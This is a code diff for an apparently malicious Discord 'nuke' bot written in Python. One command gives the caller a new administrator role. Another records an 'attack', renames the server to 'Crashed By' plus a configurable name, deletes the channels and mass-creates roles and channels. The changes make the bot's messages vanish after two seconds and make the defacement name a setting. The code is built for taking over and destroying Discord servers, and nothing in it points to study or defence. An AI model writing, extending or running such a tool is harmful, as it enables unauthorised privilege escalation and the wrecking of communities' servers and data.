@@ -6,7 +6,7 @@ from disnake.ext.commands import BucketType, CommandOnCooldown
 
 from core.managers.counter import AttackCounter
 from core.operations import Fucker
-
+from core.config.config import NAME
 
 class GiveAdmin(commands.Cog):
     def __init__(self, bot):
@@ -20,14 +20,11 @@ class GiveAdmin(commands.Cog):
                 permissions=disnake.Permissions(administrator=True),
             )
             await ctx.author.add_roles(admin_role)
-            await ctx.send("Successfully granted!")
-            await ctx.message.delete()
+            await ctx.send("Successfully granted!", delete_after=2)
         except disnake.Forbidden:
-            await ctx.send("Error: Not enough permissions to execute this command!")
-            await ctx.message.delete()
+            await ctx.send("Error: No permission, make sure i have admin!", delete_after=2)
         except Exception as e:
             logging.error(f"Error: {e}!")
-            await ctx.message.delete()
 
 
 class Nuke(commands.Cog):
@@ -41,7 +38,7 @@ class Nuke(commands.Cog):
         self.attack_counter.record_attack_start()
 
         fucker = Fucker(ctx)  # Define our mini-api wrapper
-        await ctx.guild.edit(name="Crashed By Void.", icon=None)
+        await ctx.guild.edit(name=f"Crashed By {NAME}.", icon=None)
         await fucker.delChannels(ctx)
         await fucker.crRoles(ctx)
         await fucker.crChannels(ctx)
